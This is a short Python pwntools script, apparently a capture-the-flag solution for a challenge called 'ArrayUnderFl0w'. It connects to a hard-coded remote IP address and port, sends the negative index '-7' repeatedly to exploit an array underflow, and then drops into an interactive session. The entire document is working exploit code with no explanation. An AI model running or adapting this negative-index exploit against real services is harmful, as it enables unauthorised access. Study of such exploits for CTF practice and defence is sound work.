from pwn import *

# p = process('./ArrayUnderFl0w')
p = connect('45.77.39.59', 10000)
# context.log_level = 'debug'

p.recvline()
p.recvline()
p.sendline(b'-7')

for i in range(9):
	p.recvline()
	p.recvline()
	p.recvline()
	p.sendline(b'-7')


for i in range(9):
	p.recvline()
	p.recvline()
	p.recvline()
	p.sendline(b'-7')


p.interactive()